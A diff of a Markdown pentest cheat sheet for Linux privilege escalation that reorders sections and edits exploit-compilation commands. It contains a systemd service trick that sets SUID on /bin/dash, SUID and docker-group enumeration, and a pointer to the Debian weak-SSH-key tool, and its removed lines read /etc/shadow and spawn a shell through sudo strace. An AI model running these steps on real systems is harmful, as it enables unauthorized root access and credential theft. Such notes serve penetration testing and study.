@@ -20,25 +20,15 @@ cat /etc/issue
 Compile for x86 on a x64 machine
 
 ```bash
-sudo apt update && sudo apt install gcc-multilib 
+sudo apt update && sudo apt install -y gcc-multilib 
 gcc -Wl,--hash-style=both -m32 <exploit.c>
 ```
 
 Cross-Compile for Windows from Linux
 
 ```bash
+sudo apt update && sudo apt install -y mingw-w64
 i686-w64-mingw32-gcc <exploit.c>
-```
-
----
-
-## **Systemd**
-
-```bash
-echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
-vi /lib/systemd/system/debug.service 
-edit line : ExecStart in `/tmp/priv.sh
-reboot
 ```
 
 ---
@@ -62,15 +52,6 @@ netstat -nlt | grep 'tcp ' | grep -Eo "[1-9][0-9]*" | xargs -I {} sh -c "echo ""
 
 ---
 
-## **Docker**
-
-```bash
-find / -group docker -exec ls -la {} 2>/dev/null \;
-=> on cherche le docker.sock
-```
-
----
-
 ## **Binaries enum**
 
 ```bash
@@ -79,25 +60,29 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -
 
 ---
 
-## **Hash dump**
+## **Docker**
 
 ```bash
-sudo xxd /etc/shadow | xxd -r
+# we look for docker.sock
+find / -group docker -exec ls -la {} 2>/dev/null \;
 ```
 
 ---
 
-## **Strace root**
+## **Systemd**
 
 ```bash
-sudo strace -o /dev/null /bin/sh
+echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
+vi /lib/systemd/system/debug.service 
+edit line : ExecStart in `/tmp/priv.sh
+reboot
 ```
 
 ---
 
-## Debian-ssh
+## **Debian-ssh**
 
-[g0tmi1k tuto](https://github.com/g0tmi1k/debian-ssh)
+- [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ```bash
 git clone https://github.com/g0tmi1k/debian-ssh.git
